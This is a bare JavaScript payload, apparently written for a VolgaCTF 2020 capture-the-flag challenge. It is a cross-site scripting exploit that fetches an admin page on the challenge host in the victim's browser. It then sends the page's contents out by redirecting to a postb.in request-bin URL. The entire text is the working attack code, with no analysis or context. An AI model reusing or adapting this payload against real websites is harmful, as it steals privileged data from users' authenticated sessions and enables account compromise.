var a = new XMLHttpRequest();
a.open('GET', 'newsletter.q.2020.volgactf.ru/adminss', false);
a.send(null);
b = a.responseText;
location.href = 'https://postb.in/1585337011882-6569399423897' + escape(b);
